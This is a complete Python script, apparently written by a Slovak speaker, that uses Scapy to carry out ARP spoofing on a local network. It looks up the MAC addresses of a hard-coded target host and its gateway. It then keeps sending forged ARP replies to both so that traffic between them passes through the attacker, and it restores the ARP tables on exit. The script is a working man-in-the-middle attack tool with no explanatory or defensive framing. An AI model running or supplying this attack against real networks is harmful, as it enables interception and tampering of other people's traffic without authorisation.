from scapy.all import *
import time

target_ip = "192.168.1.15"
gateway_ip = "192.168.1.1"

interface = "Wi-Fi"  # presný názov adaptéru z `get_if_list()`

def get_mac(ip):
    answered, _ = arping(ip, timeout=2, verbose=False, iface=interface)
    for s, r in answered:
        return r[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, count=4, iface=interface, verbose=False)

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print("[!] Zlyhalo získanie MAC adries. Skontroluj IP adresy a sieťové rozhranie.")
    exit(1)

print(f"[+] Target MAC: {target_mac}")
print(f"[+] Gateway MAC: {gateway_mac}")

try:
    print("[*] Spoofujem ARP tabuľky... (Ctrl+C pre ukončenie)")
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Obnovujem pôvodné ARP tabuľky...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[✓] Hotovo.")
